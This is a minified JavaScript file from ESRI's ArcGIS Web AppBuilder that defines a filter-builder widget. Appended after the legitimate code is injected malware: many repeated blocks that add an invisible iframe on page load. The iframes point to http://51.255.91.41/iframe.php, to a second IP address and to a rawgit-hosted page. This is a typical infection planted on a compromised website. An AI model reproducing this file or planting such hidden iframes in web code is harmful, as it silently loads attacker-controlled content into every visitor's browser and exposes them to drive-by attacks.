// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/_SingleFilter.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"settings-container"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"fieldsSelect" data-dojo-type\x3d"dijit/form/FilteringSelect" data-dojo-props\x3d\'searchAttr:"displayName",required:true,intermediateChanges:true\' class\x3d"fields-select dijit-form-FilteringSelect"\x3e\x3c/div\x3e\r\n    \x3cselect data-dojo-attach-point\x3d"operatorsSelect" data-dojo-type\x3d"dijit/form/Select" class\x3d"operator-select dijit-form-Select restrict-select-width"\x3e\r\n      \x3coption value\x3d"none"\x3e${nls.none}\x3c/option\x3e\r\n    \x3c/select\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"attributeValueContainer" class\x3d"attribute-value-container"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"valueProviderContainer" class\x3d"value-provider-container"\x3e\x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"valueTypeSetNode" title\x3d"${nls.setInputType}" class\x3d"value-type-set jimu-icon jimu-icon-setting" data-dojo-attach-event\x3d"click:_onValueTypeSetClick"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-icon jimu-icon-delete" data-dojo-attach-point\x3d"btnDelete" data-dojo-attach-event\x3d"click:_destroySelf"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv class\x3d"askvalues"\x3e\r\n    \x3cdiv data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"cbxAskValues" label\x3d"${nls.askForValues}" class\x3d"jimu-trailing-margin6"\x3e\x3c/div\x3e\r\n    \x3cdiv data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"cbxCaseSensitive" label\x3d"${nls.caseSensitive}" style\x3d"display:none;"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv data-dojo-attach-point\x3d"promptSection" class\x3d"prompt"\x3e\r\n    \x3ctable data-dojo-attach-point\x3d"promptTable" cellpadding\x3d"0" cellspacing\x3d"0" class\x3d"prompt-table" style\x3d"width:100%;"\x3e\r\n      \x3ctbody\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first-td"\x3e\r\n            \x3cspan\x3e${nls.prompt}\x3c/span\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd class\x3d"second-td"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"promptTB" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"required:true,trim:true" style\x3d"width:257px;" class\x3d"dijit-form-ValidationTextBox" \x3e\x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first-td"\x3e\r\n            \x3cspan\x3e${nls.hint}\x3c/span\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd class\x3d"second-td"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"hintTB" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"trim:true" style\x3d"width:257px;" class\x3d"dijit-form-ValidationTextBox" \x3e\x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr data-dojo-attach-point\x3d"cascadeTr" class\x3d"cascade-tr"\x3e\r\n          \x3ctd class\x3d"first-td"\x3e\r\n            \x3cdiv style\x3d"margin-bottom:5px;"\x3e${nls.listValues}:\x3c/div\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd class\x3d"second-td"\x3e\r\n            \x3cselect data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-point\x3d"cascadeSelect" class\x3d"cascade-select restrict-select-width" style\x3d"width:100%;"\x3e\r\n              \x3coption value\x3d"none"\x3e${nls.noneCascadeFilterTip}\x3c/option\x3e\r\n              \x3coption value\x3d"previous"\x3e${nls.previousCascadeFilterTip}\x3c/option\x3e\r\n              \x3coption value\x3d"all"\x3e${nls.allCascadeFilterTip}\x3c/option\x3e\r\n            \x3c/select\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n      \x3c/tbody\x3e\r\n    \x3c/table\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv class\x3d"value-type-popup" data-dojo-attach-point\x3d"valueTypePopupNode"\x3e\r\n    \x3cul\x3e\r\n      \x3cli data-type\x3d"value" data-dojo-attach-event\x3d"click:_onValueTypeClick"\x3e\x3cspan\x3e${nls.value}\x3c/span\x3e\x3cspan\x3e\x3c/span\x3e\x3c/li\x3e\r\n      \x3cli data-type\x3d"field" data-dojo-attach-event\x3d"click:_onValueTypeClick"\x3e\x3cspan\x3e${nls.field}\x3c/span\x3e\x3cspan\x3e\x3c/span\x3e\x3c/li\x3e\r\n      \x3cli data-type\x3d"unique" data-dojo-attach-event\x3d"click:_onValueTypeClick"\x3e\x3cspan\x3e${nls.unique}\x3c/span\x3e\x3cspan\x3e\x3c/span\x3e\x3c/li\x3e\r\n    \x3c/ul\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/Evented dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/_SingleFilter.html dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on dojo/query dojo/store/Memory jimu/utils jimu/dijit/_filter/ValueProviderFactory jimu/dijit/CheckBox dijit/form/Select dijit/form/FilteringSelect dijit/form/ValidationTextBox dijit/popup dijit/TooltipDialog".split(" "),function(m,n,p,q,r,t,d,b,k,g,h,u,v,l,w,x){return n([p,q,r,m],{templateString:t,
baseClass:"jimu-single-filter",declaredClass:"jimu.dijit._SingleFilter",nls:null,url:null,layerInfo:null,stringFieldType:"",dateFieldType:"",numberFieldTypes:[],supportFieldTypes:[],part:null,OPERATORS:null,enableAskForValues:!1,isHosted:!1,valueProviderFactory:null,valueProvider:null,postMixInProperties:function(){this.supportFieldTypes=[];this.supportFieldTypes.push(this.stringFieldType);this.supportFieldTypes.push(this.dateFieldType);this.supportFieldTypes=this.supportFieldTypes.concat(this.numberFieldTypes);
this.nls=window.jimuNls.filterBuilder},postCreate:function(){this.inherited(arguments);this._initSelf();this.own(g(document,"click",d.hitch(this,function(){b.setStyle(this.valueTypePopupNode,"display","none")})))},toJson:function(){var a={fieldObj:"",operator:"",valueObj:"",interactiveObj:"",caseSensitive:!1},c=this._getFieldObjByUI();if(!c)return null;a.fieldObj=c;c=this._getOperatorByUI();if(!c)return null;a.operator=c;a.caseSensitive=this.cbxCaseSensitive.getStatus()&&this.cbxCaseSensitive.getValue();
if(c=this._isUseAskForValues()){if(!this.promptTB.validate())return this._showValidationErrorTip(this.promptTB),null;a.interactiveObj={prompt:this.promptTB.get("value"),hint:this.hintTB.get("value"),cascade:"none"};"unique"===this._getValueTypeByUI()&&(a.interactiveObj.cascade=this.cascadeSelect.get("value"))}a.valueObj={isValid:!0,type:""};c=c?this.valueProvider.tryGetValueObject():this.valueProvider.getValueObject();if(!c)return null;c.type=this._getValueTypeByUI();a.valueObj=c;return a},_getFieldObjByUI:function(){var a=
this._getSelectedFilteringItem(this.fieldsSelect);return a?{name:a.name,label:a.name,shortType:a.shortType,type:a.type}:null},_getOperatorByUI:function(){var a=this.operatorsSelect.get("value");"none"===a&&(a=null);return a},showDelteIcon:function(){b.setStyle(this.btnDelete,"display","inline-block")},hideDeleteIcon:function(){b.setStyle(this.btnDelete,"display","none")},_showAndEnableCaseSensitive:function(){this.cbxCaseSensitive.setStatus(!0);b.setStyle(this.cbxCaseSensitive.domNode,"display","inline-block")},
_hideAndDisableCaseSensitive:function(){this.cbxCaseSensitive.setStatus(!1);b.setStyle(this.cbxCaseSensitive.domNode,"display","none")},_initSelf:function(){this.layerInfo=d.mixin({},this.layerInfo);this.isHosted&&(this.cbxCaseSensitive.setValue(!1),this.cbxCaseSensitive.setStatus(!1),this.cbxCaseSensitive.domNode.title=this.nls.notSupportCaseSensitiveTip);this.own(g(this.fieldsSelect,"MouseEnter",d.hitch(this,this._updateFieldsSelectTitle)));this.own(g(this.operatorsSelect,"MouseEnter",d.hitch(this,
this._updateOperatorsSelectTitle)));this.enableAskForValues?(b.setStyle(this.cbxAskValues.domNode,"display","inline-block"),b.setStyle(this.promptSection,"display","block"),this.own(g(this.cbxAskValues,"status-change",d.hitch(this,this._onCbxAskValuesStatusChanged))),this.cbxAskValues.onChange=d.hitch(this,this._onCbxAskValuesClicked)):(b.setStyle(this.cbxAskValues.domNode,"display","none"),b.setStyle(this.promptSection,"display","none"));var a=this.layerInfo.fields;a&&0<a.length&&(a=k.filter(a,d.hitch(this,
function(a){return 0<=this.supportFieldTypes.indexOf(a.type)})),0<a.length&&(this._enableAllValueTypeOptions(),this._initFieldsSelect(a),this.part?this._showPart(this.part):this._resetByFieldAndOperator(),setTimeout(d.hitch(this,function(){this._bindFieldsSelectChangeAndOperatorChangeEvents()}),10)))},_bindFieldsSelectChangeAndOperatorChangeEvents:function(){this._removeFieldsSelectChangeAndOperatorChangeEvents();this._handle1=g(this.fieldsSelect,"change",d.hitch(this,this._onFieldsSelectChange));
this._handle2=g(this.operatorsSelect,"change",d.hitch(this,this._onOperatorsSelectChange))},_removeFieldsSelectChangeAndOperatorChangeEvents:function(){this._handle1&&this._handle1.remove();this._handle2&&this._handle2.remove();this._handle2=this._handle1=null},_isServiceSupportDistinctValues:function(a,c){return this._isStreamServer(a)?!1:10.1<=parseFloat(c.currentVersion)},_isStreamServer:function(a){a=(a||"").replace(/\/*$/g,"");return/\/StreamServer$/gi.test(a)},_updateFieldsSelectTitle:function(){this.fieldsSelect.domNode.title=
"";var a=this._getSelectedFilteringItem(this.fieldsSelect);a&&(this.fieldsSelect.domNode.title=a.displayName||a.alias||a.name)},_updateOperatorsSelectTitle:function(){this.operatorsSelect.domNode.title="";var a=this.operatorsSelect.get("value");a&&(a=this.operatorsSelect.getOptions(a),this.operatorsSelect.domNode.title=a.label)},_showValidationErrorTip:function(a){try{!a.validate()&&a.domNode&&a.focusNode&&(a.focusNode.focus(),a.focusNode.blur())}catch(c){console.error(c)}},_getSelectedFilteringItem:function(a){if(a.validate()){var c=
a.get("item");if(c)return c}this._showValidationErrorTip(a);return null},_getShortTypeByFieldType:function(a){return a===this.stringFieldType?"string":a===this.dateFieldType?"date":0<=this.numberFieldTypes.indexOf(a)?"number":null},_initFieldsSelect:function(a){a=k.map(a,d.hitch(this,function(a,c){var b=d.mixin({},a);b.id=c;b.shortType=this._getShortTypeByFieldType(a.type);b.alias||(b.alias=b.name);a="";"string"===b.shortType?a=this.nls.string:"number"===b.shortType?a=this.nls.number:"date"===b.shortType&&
(a=this.nls.date);b.displayName=b.alias+" ("+a+")";return b}));if(0<a.length){var c=new u({data:a});this.fieldsSelect.set("store",c);this.fieldsSelect.set("value",a[0].id)}this._updateOperatorsByFieldsSelect()},_showPart:function(a){if((this.part=a)&&this.part.fieldObj&&this.part.operator&&this.part.valueObj){this._removeFieldsSelectChangeAndOperatorChangeEvents();var c=this.part.fieldObj.name;a=this.part.operator;this.part.caseSensitive=!!this.part.caseSensitive;c=this.fieldsSelect.store.query({name:c});
0!==c.length&&(c=c[0])&&(this.fieldsSelect.set("value",c.id),this._updateOperatorsByFieldsSelect(),this.operatorsSelect.set("value",a),this._resetByFieldAndOperator(this.part),a=this.part.interactiveObj)&&(this.cbxAskValues.check(),this._updatePrompt(),this.promptTB.set("value",a.prompt||""),this.hintTB.set("value",a.hint||""),"unique"===this.part.valueObj.type?this.cascadeSelect.set("value",a.cascade):this.cascadeSelect.set("value","none"))}},_onFieldsSelectChange:function(){this._updateOperatorsByFieldsSelect();
this._resetByFieldAndOperator()},_updateOperatorsByFieldsSelect:function(){this._updateFieldsSelectTitle();this.operatorsSelect.removeOption(this.operatorsSelect.getOptions());this.operatorsSelect.addOption({value:"none",label:this.nls.none});var a=this._getSelectedFilteringItem(this.fieldsSelect);a&&(this.operatorsSelect.shortType=a.shortType,a=l.getOperatorsByShortType(a.shortType),this.operatorsSelect.removeOption(this.operatorsSelect.getOptions()),k.forEach(a,d.hitch(this,function(a){this.operatorsSelect.addOption({value:a,
label:this.nls[a]})})))},_onOperatorsSelectChange:function(){this._resetByFieldAndOperator()},_updateValueTypeClass:function(){b.removeClass(this.domNode,"value-type");b.removeClass(this.domNode,"field-type");b.removeClass(this.domNode,"unique-type");b.removeClass(this.domNode,"support-cascade");var a=this._getValueTypeByUI();"value"===a?(b.addClass(this.domNode,"value-type"),this.cascadeSelect.set("value","none")):"field"===a?(b.addClass(this.domNode,"field-type"),this.cascadeSelect.set("value",
"none")):(b.addClass(this.domNode,"unique-type"),this.cascadeSelect.set("value","previous"),a=!0,a=this._getSelectedFilteringItem(this.fieldsSelect),a=this._getCodedValuesOrTypesCount(a),(a=0<a?v.isCodedValuesSupportFilter(this.layerInfo,a):!0)?(this.cascadeSelect.set("value","previous"),b.addClass(this.domNode,"support-cascade")):this.cascadeSelect.set("value","none"))},_getCodedValuesOrTypesCount:function(a){if(a){if(a.domain&&"codedValue"===a.domain.type&&a.domain.codedValues)return a.domain.codedValues.length;
if(this.layerInfo.typeIdField===a.name&&this.layerInfo.types)return this.layerInfo.types.length}return 0},_enableValueTypeSelectOption:function(a,c){a=h("li[data-type\x3d"+a+"]",this.valueTypePopupNode)[0];c?b.removeClass(a,"disabled"):b.addClass(a,"disabled")},_onValueTypeSetClick:function(a){var c=b.position(a.target),e;e=this.isInFilterSet?this.domNode.parentNode.parentNode.parentNode:this.domNode.parentNode;var f=b.position(e);if("none"!==b.getStyle(this.valueTypePopupNode,"display"))b.setStyle(this.valueTypePopupNode,
"display","none");else{k.forEach(h(".value-type-popup",e),function(a){b.setStyle(a,"display","none")},this);b.place(this.valueTypePopupNode,e);var d;d=b.hasClass(h(".desktop-add-section",e.parentNode)[0],"hidden")?55:90;d=c.y-f.y-e.parentNode.scrollTop+d;d+170>e.parentNode.scrollHeight&&(d=e.parentNode.scrollHeight-170);window.isRTL?c=c.x-f.x+20:(c=c.x-f.x-100,c+150>e.clientWidth&&(c=e.clientWidth-150));b.setStyle(this.valueTypePopupNode,{display:"block",left:c+"px",top:d+"px"});a.stopPropagation()}},
_onValueTypeClick:function(a){var c=b.getAttr(a.currentTarget,"data-type");b.hasClass(a.currentTarget,"disabled")?a.stopPropagation():(h("li",this.valueTypePopupNode).forEach(function(a){b.removeClass(a,"selected")}),b.addClass(a.currentTarget,"selected"),this._resetByFieldAndOperator(null,c))},_enableValueTypeOption:function(a){this._enableValueTypeSelectOption("value",a)},_enableFieldTypeOption:function(a){this._enableValueTypeSelectOption("field",a)},_enableUniqueTypeOption:function(a){this._enableValueTypeSelectOption("unique",
a)},_enableAllValueTypeOptions:function(){this._enableValueTypeOption(!0);this._enableFieldTypeOption(!0);this._enableUniqueTypeOption(!0)},_disableAllValueTypeOptions:function(){this._enableValueTypeOption(!1);this._enableFieldTypeOption(!1);this._enableUniqueTypeOption(!1)},_resetByFieldAndOperator:function(a,c){this._updateOperatorsSelectTitle();this.valueProvider&&this.valueProvider.destroy();this._hideAndDisableCaseSensitive();this._disableAllValueTypeOptions();a||(a={fieldObj:"",operator:"",
valueObj:"",interactiveObj:"",caseSensitive:!1},a.fieldObj=this._getFieldObjByUI(),a.operator=this._getOperatorByUI());var e=[],f=null;a.fieldObj&&a.operator&&(e=this.valueProviderFactory.getSupportedValueTypes(a.fieldObj.name,a.operator),a.valueObj?f=a.valueObj.type:(f=c&&0<=e.indexOf(c)?c:e[0],a.valueObj={type:f}),0<=e.indexOf("value")&&this._enableValueTypeOption(!0),0<=e.indexOf("field")&&this._enableFieldTypeOption(!0),0<=e.indexOf("unique")&&this._enableUniqueTypeOption(!0),"value"===f?this._enableValueTypeOption(!0):
"field"===f?this._enableFieldTypeOption(!0):"unique"===f&&this._enableUniqueTypeOption(!0),this._updateValueTypeUI(f));0<e.length?(this.valueProvider=this.valueProviderFactory.getValueProvider(a,!1),this.valueProvider.placeAt(this.valueProviderContainer),this.valueProvider.setValueObject(a.valueObj),this.own(g(this.valueProvider,"change",d.hitch(this,function(){this.emit("change")}))),this.valueProvider.bindChangeEvents(),this.valueProvider.isBlankValueProvider()?(b.addClass(this.valueProvider.domNode,
"hidden"),b.addClass(this.attributeValueContainer,"hidden")):b.removeClass(this.attributeValueContainer,"hidden"),(c=l.getOperatorInfo(a.operator))&&f&&(c[f]&&c[f].supportCaseSensitive&&this._showAndEnableCaseSensitive(),a&&this.cbxCaseSensitive.setValue(a.caseSensitive))):b.addClass(this.attributeValueContainer,"hidden");this._updateWhenValueRadioChanged();this.emit("change")},_updateWhenValueRadioChanged:function(){this._updatePrompt();this._updateValueTypeClass()},_onCbxAskValuesClicked:function(){this._updateRequiredProperty();
this._updatePrompt()},_onCbxAskValuesStatusChanged:function(){this._updateRequiredProperty()},_isUseAskForValues:function(){return this.cbxAskValues.status&&this.cbxAskValues.checked},_isValueRequired:function(){return!this._isUseAskForValues()},_updateRequiredProperty:function(){var a=this._isValueRequired();this.valueProvider.setRequired(a)},_getValueTypeByUI:function(){var a=h("li.selected",this.valueTypePopupNode)[0];return a?b.getAttr(a,"data-type"):null},_updateValueTypeUI:function(a){h("li",
this.valueTypePopupNode).forEach(function(a){b.removeClass(a,"selected")});if(a=h("li[data-type\x3d"+a+"]",this.valueTypePopupNode)[0])return b.addClass(a,"selected")},_updatePrompt:function(){this.promptTB.set("value","");this.hintTB.set("value","");this.cbxAskValues.setStatus(!0);b.setStyle(this.promptTable,"display","table");var a=this.operatorsSelect.get("value"),c=this.nls[a],e=!1,d=this._getValueTypeByUI(),g=l.getOperatorInfo(a);g&&d&&(d=g[d])&&d.supportAskForValue&&(e=!0);e||(this.cbxAskValues.uncheck(!0),
this.cbxAskValues.setStatus(!1));this.cbxAskValues.status&&this.cbxAskValues.checked?(b.setStyle(this.promptTable,"display","table"),(e=this._getSelectedFilteringItem(this.fieldsSelect))&&"none"!==a&&this.promptTB.set("value",(e.alias||e.name)+" "+c)):b.setStyle(this.promptTable,"display","none")},_destroySelf:function(){this.destroy()},destroy:function(){this._removeFieldsSelectChangeAndOperatorChangeEvents();this.inherited(arguments)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});